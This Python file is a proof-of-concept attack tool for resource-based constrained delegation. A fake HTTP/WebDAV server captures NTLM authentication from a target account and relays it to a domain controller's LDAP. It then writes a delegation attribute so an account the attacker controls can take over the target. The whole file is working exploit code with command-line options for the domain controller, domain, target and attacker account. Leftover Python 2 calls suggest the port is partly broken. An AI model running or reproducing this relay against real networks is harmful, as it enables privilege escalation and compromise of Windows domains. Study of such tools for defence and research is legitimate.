#!/usr/bin/env python

# for more info: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
# this is a *very* rough PoC

import http.server
import socketserver
import base64
import random
import struct
import configparser
import string
import argparse
from threading import Thread

from impacket import ntlm
from impacket.spnego import SPNEGO_NegTokenResp
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMAuthChallengeResponse

from binascii import hexlify

import sys
from struct import unpack
from impacket.ldap import ldaptypes
from ldap3 import Server, Connection, ALL, NTLM, MODIFY_ADD, MODIFY_REPLACE, SUBTREE
from ldap3.operation import bind
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM, RESULT_SUCCESS, RESULT_STRONGER_AUTH_REQUIRED

import binascii

# lots (most) of code from the impacket repo, but particularly:
# https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/servers/httprelayserver.py
# https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/clients/ldaprelayclient.py


class LDAPRelayClientException(Exception):
    pass


class LDAPRelayClient:

    def __init__(self, extendedSecurity=True, dc_ip='', target='', domain='', username=''):
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.server = None
        self.targetPort = 389

        self.dc_ip = dc_ip
        self.domain = domain
        self.target = target
        self.username = username

    def get_base_dn(self):
        base_dn = ''
        domain_parts = self.domain.split('.')
        for i in domain_parts:
            base_dn += 'DC=%s,' % i
        base_dn = base_dn[:-1]
        return base_dn

    # RBCD attack stuff

    def get_sid(self, ldap_connection, domain, target):
        search_filter = "(sAMAccountName=%s)" % target
        base_dn = self.get_base_dn()
        try:
            ldap_connection.search(
                base_dn, search_filter, attributes=['objectSid'])
            target_sid_readable = ldap_connection.entries[0].objectSid
            target_sid = ''.join(
                ldap_connection.entries[0].objectSid.raw_values)
        except Exception as e:
            print("[!] unable to to get SID of target: %s" % str(e))
        return target_sid

    def add_attribute(self, ldap_connection, user_sid):
        # "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<sid>"
        security_descriptor = (
            "\x01\x00\x04\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            "\x24\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05\x20\x00\x00\x00"
            "\x20\x02\x00\x00\x02\x00\x2C\x00\x01\x00\x00\x00\x00\x00\x24\x00"
            "\xFF\x01\x0F\x00"
        )

        # build payload
        payload = security_descriptor + user_sid
#        print "[*] built payload (hex): %s" % hexlify(payload)

        # build LDAP query
        if self.target.endswith("$"):  # assume computer account
            dn_base = "CN=%s,CN=Computers," % self.target[:-1]
        else:
            dn_base = "CN=%s,CN=Users," % self.target
        dn = dn_base + self.get_base_dn()
        try:
            if ldap_connection.modify(dn, {'msds-allowedtoactonbehalfofotheridentity': (MODIFY_REPLACE, payload)}):
                print("[+] added msDS-AllowedToActOnBehalfOfOtherIdentity to object %s for object %s" %
                      (self.target, self.username))
            else:
                print("[!] unable to modify attribute")
        except Exception as e:
            print("[!] unable to assign attribute: %s" % str(e))

    # back to LDAP relay client stuff

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        #        print "[*] initiating connection to ldap://%s:%s" % (self.dc_ip, self.targetPort)
        self.server = Server("ldap://%s:%s" %
                             (self.dc_ip, self.targetPort), get_info=ALL)
        self.session = Connection(
            self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

    def sendNegotiate(self, negotiateMessage):
        negoMessage = NTLMAuthNegotiate()
        negoMessage.fromString(negotiateMessage)
        self.negotiateMessage = str(negoMessage)

        with self.session.connection_lock:
            if not self.session.sasl_in_progress:
                self.session.sasl_in_progress = True
                request = bind.bind_operation(
                    self.session.version, 'SICILY_PACKAGE_DISCOVERY')
                response = self.session.post_send_single_response(
                    self.session.send('bindRequest', request, None))
                result = response[0]
                try:
                    sicily_packages = result['server_creds'].decode(
                        'ascii').split(';')
                except KeyError:
                    raise LDAPRelayClientException(
                        '[!] failed to discover authentication methods, server replied: %s' % result)

                if 'NTLM' in sicily_packages:  # NTLM available on server
                    request = bind.bind_operation(
                        self.session.version, 'SICILY_NEGOTIATE_NTLM', self)
                    response = self.session.post_send_single_response(
                        self.session.send('bindRequest', request, None))
                    result = response[0]

                    if result['result'] == RESULT_SUCCESS:
                        challenge = NTLMAuthChallenge()
                        challenge.fromString(result['server_creds'])
                        return challenge
                else:
                    raise LDAPRelayClientException(
                        '[!] server did not offer ntlm authentication')

    # This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_negotiate_message(self):
        return self.negotiateMessage

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
            print("unpacked response token: " + str(token))
        else:
            token = authenticateMessageBlob
        with self.session.connection_lock:
            self.authenticateMessageBlob = token
            request = bind.bind_operation(
                self.session.version, 'SICILY_RESPONSE_NTLM', self, None)
            response = self.session.post_send_single_response(
                self.session.send('bindRequest', request, None))
            result = response[0]
        self.session.sasl_in_progress = False

        if result['result'] == RESULT_SUCCESS:
            self.session.bound = True
            self.session.refresh_server_info()
            print("[+] relay complete, running attack")
            user_sid = self.get_sid(self.session, self.domain, self.username)
            self.add_attribute(self.session, user_sid)
            return True, STATUS_SUCCESS
        else:
            print("[!] result is failed")
            if result['result'] == RESULT_STRONGER_AUTH_REQUIRED:
                raise LDAPRelayClientException('[!] ldap signing is enabled')
        return None, STATUS_ACCESS_DENIED

    # This is a fake function for ldap3 which wants an NTLM client with specific methods
    def create_authenticate_message(self):
        return self.authenticateMessageBlob

    # Placeholder function for ldap3
    def parse_challenge_message(self, message):
        pass


class LDAPSRelayClient(LDAPRelayClient):
    PLUGIN_NAME = "LDAPS"
    MODIFY_ADD = MODIFY_ADD

    def __init__(self, serverConfig, target, targetPort=636, extendedSecurity=True):
        LDAPRelayClient.__init__(
            self, serverConfig, target, targetPort, extendedSecurity)

    def initConnection(self):
        self.server = Server("ldaps://%s:%s" %
                             (self.targetHost, self.targetPort), get_info=ALL)
        self.session = Connection(
            self.server, user="a", password="b", authentication=NTLM)
        self.session.open(False)
        return True

# LDAP RELAY STUFF
# Authors:
#   Alberto Solino (@agsolino)
#   Matt Bush (@3xocyte)
#   Elad Shamir (@elad_shamir)
#   Ported By ( @Beingsheerazali )

class HTTPRelayServer(Thread):
    class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
        def __init__(self, server_address, RequestHandlerClass):
            socketserver.TCPServer.__init__(
                self, server_address, RequestHandlerClass)

    class HTTPHandler(http.server.SimpleHTTPRequestHandler):

        _dc_ip = ''
        _domain = ''
        _target = ''
        _username = ''

        def __init__(self, request, client_address, server):
            self.protocol_version = 'HTTP/1.1'
            self.challengeMessage = None
            self.client = None
            self.machineAccount = None
            self.machineHashes = None
            self.domainIp = None
            self.authUser = None

#            print "[*] got connection from %s" % (client_address[0])
            http.server.SimpleHTTPRequestHandler.__init__(
                self, request, client_address, server)

        def handle_one_request(self):
            http.server.SimpleHTTPRequestHandler.handle_one_request(self)

        def log_message(self, format, *args):
            return

        def do_REDIRECT(self):
            rstr = ''.join(random.choice(
                string.ascii_uppercase + string.digits) for _ in range(10))
            self.send_response(302)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-type', 'text/html')
            self.send_header('Connection', 'close')
            self.send_header('Location', '/%s' % rstr)
            self.send_header('Content-Length', '0')
            self.end_headers()

        def do_HEAD(self):
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

        def do_OPTIONS(self):
            self.send_response(200)
            self.send_header(
                'Allow', 'GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY')
            self.send_header('Content-Length', '0')
            self.send_header('Connection', 'close')
            self.end_headers()
            return

        def do_PROPFIND(self):
            if (".jpg" in self.path) or (".JPG" in self.path):
                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://relay/a/dummy.JPG/</D:href><D:propstat><D:prop><D:creationdate>2018-12-25T23:01:48Z</D:creationdate><D:displayname>dummy.JPG</D:displayname><D:getcontentlength>9187</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>9ec45f983d64beb5ee830d03a963c9b0</D:getetag><D:getlastmodified>Thu, 20 Dec 2018 00:50:27 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
            else:
                content = """<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://relay/a/</D:href><D:propstat><D:prop><D:creationdate>2018-12-25T23:01:45Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Tue, 25 Dec 2018 23:01:48 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""

            messageType = 0
            if self.headers.getheader('Authorization') is None:
                self.do_AUTHHEAD(message='NTLM')
                pass
            else:
                typeX = self.headers.getheader('Authorization')
                try:
                    _, blob = typeX.split('NTLM')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD()
                messageType = struct.unpack(
                    '<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 1:
                if not self.do_ntlm_negotiate(token):
                    print("[*] do negotiate failed, sending redirect")
                    self.do_REDIRECT()
            elif messageType == 3:
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
#                print "[*] client authenticating as " + str(authenticateMessage['domain_name']).decode('utf-16le') + "\\" +  str(authenticateMessage['user_name']).decode('utf-16le')
#                if str(authenticateMessage['user_name']).decode('utf-16le').upper() != self._target.upper():
#                    print "[!] this account %s is not the target account %s" % ((authenticateMessage['user_name']).decode('utf-16le').upper(), self._target.upper())
#                else:
                if str(authenticateMessage['user_name']).decode('utf-16le').upper() == self._target.upper():
                    print("[+] target acquired")
                    self.do_ntlm_auth(token, authenticateMessage)
                self.send_response(207, "Multi-Status")
                self.send_header('Content-Type', 'application/xml')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            return

        def do_GET(self):

            messageType = 0
            if self.headers.getheader('Authorization') is None:
                self.do_AUTHHEAD(message='NTLM')
                pass
            else:
                typeX = self.headers.getheader('Authorization')
                try:
                    _, blob = typeX.split('NTLM')
                    token = base64.b64decode(blob.strip())
                except:
                    self.do_AUTHHEAD()
                messageType = struct.unpack(
                    '<L', token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]

            if messageType == 1:
                if not self.do_ntlm_negotiate(token):
                    print("[*] do negotiate failed, sending redirect")
                    self.do_REDIRECT()
            elif messageType == 3:
                authenticateMessage = NTLMAuthChallengeResponse()
                authenticateMessage.fromString(token)
#                print "[*] client authenticating as " + str(authenticateMessage['domain_name']).decode('utf-16le') + "\\" +  str(authenticateMessage['user_name']).decode('utf-16le')
#                if str(authenticateMessage['user_name']).decode('utf-16le').upper() != self._target.upper():
#                    print "[!] this account %s is not the target account %s" % ((authenticateMessage['user_name']).decode('utf-16le').upper(), self._target.upper())
#                else:
                if str(authenticateMessage['user_name']).decode('utf-16le').upper() == self._target.upper():
                    print("[+] target acquired")
                    self.do_ntlm_auth(token, authenticateMessage)
                file_data = "ffd8ffe000104a46494600010101007800780000ffdb0043000201010201010202020202020202030503030303030604040305070607070706070708090b0908080a0807070a0d0a0a0b0c0c0c0c07090e0f0d0c0e0b0c0c0cffdb004301020202030303060303060c0807080c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0c0cffc00011080001000103012200021101031101ffc4001f0000010501010101010100000000000000000102030405060708090a0bffc400b5100002010303020403050504040000017d01020300041105122131410613516107227114328191a1082342b1c11552d1f02433627282090a161718191a25262728292a3435363738393a434445464748494a535455565758595a636465666768696a737475767778797a838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae1e2e3e4e5e6e7e8e9eaf1f2f3f4f5f6f7f8f9faffc4001f0100030101010101010101010000000000000102030405060708090a0bffc400b51100020102040403040705040400010277000102031104052131061241510761711322328108144291a1b1c109233352f0156272d10a162434e125f11718191a262728292a35363738393a434445464748494a535455565758595a636465666768696a737475767778797a82838485868788898a92939495969798999aa2a3a4a5a6a7a8a9aab2b3b4b5b6b7b8b9bac2c3c4c5c6c7c8c9cad2d3d4d5d6d7d8d9dae2e3e4e5e6e7e8e9eaf2f3f4f5f6f7f8f9faffda000c03010002110311003f00fdfca28a2803ffd9".decode(
                    "hex")

                self.send_response(200, "OK")
                self.send_header('Content-type', 'image/jpeg')
                self.send_header('Content-Length', str(len(file_data)))
                self.end_headers()

                self.wfile.write(file_data)
            return

        def do_AUTHHEAD(self, message=''):
            self.send_response(401)
            self.send_header('WWW-Authenticate', message)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-Length', '0')
            self.end_headers()

        # relay
        def do_ntlm_negotiate(self, token):
            try:
                self.client = LDAPRelayClient(
                    dc_ip=self._dc_ip, target=self._target, domain=self._domain, username=self._username)
                self.client.initConnection()
                clientChallengeMessage = self.client.sendNegotiate(token)
            except Exception as e:
                print("[*] connection to ldap server %s failed" % self._dc_ip)
                print(str(e))
                return False
            self.do_AUTHHEAD(
                message='NTLM '+base64.b64encode(clientChallengeMessage.getData()))
            return True

        # PoC-ness
        def do_ntlm_auth(self, token, authenticateMessage):
            client_session, errorCode = self.client.sendAuth(token)
            if errorCode == STATUS_SUCCESS:
                return client_session
            else:
                return False

    def __init__(self, domain='', dc_ip='', username='', target=''):
        Thread.__init__(self)
        self.daemon = True
        self.domain = domain
        self.dc_ip = dc_ip
        self.username = username
        self.target = target

    def run(self):
        #        print "[*] setting up http server"
        httpd = self.HTTPServer(("", 80), self.HTTPHandler)
        self.HTTPHandler._dc_ip = self.dc_ip
        self.HTTPHandler._domain = self.domain
        self.HTTPHandler._username = self.username
        self.HTTPHandler._target = self.target
        thread = Thread(target=httpd.serve_forever)
        thread.daemon = True
        thread.start()


# Process command-line arguments.
if __name__ == '__main__':

    # parser stuff
    parser = argparse.ArgumentParser(
        add_help=True, description="poc rbcd relay tool")
    parser.add_argument(
        'dc', help='ip address or hostname of dc (the ldap server)')
    parser.add_argument('domain', action="store",
                        help='valid fully-qualified domain name')
    parser.add_argument(
        'target', help='name of object to add attribute TO (the account you want to relay and take control of)')
    parser.add_argument('username', action="store", default='',
                        help=' name of object to add attribute FOR (this should be an account that has an SPN and that you already control)')
    options = parser.parse_args()

    print("=> PoC RBCD relay attack tool by @3xocyte and @elad_shamir, from code by @agsolino and @_dirkjan. Ported by @beingsheerazali")

    print("[+] target is %s" % options.target.upper())
    print("[*] starting hybrid http/webdav server...")
    s = HTTPRelayServer(domain=options.domain, dc_ip=options.dc,
                        username=options.username, target=options.target)
    s.run()

    while True:
        try:
            sys.stdin.read()
        except KeyboardInterrupt:
            sys.exit(1)
        else:
            pass
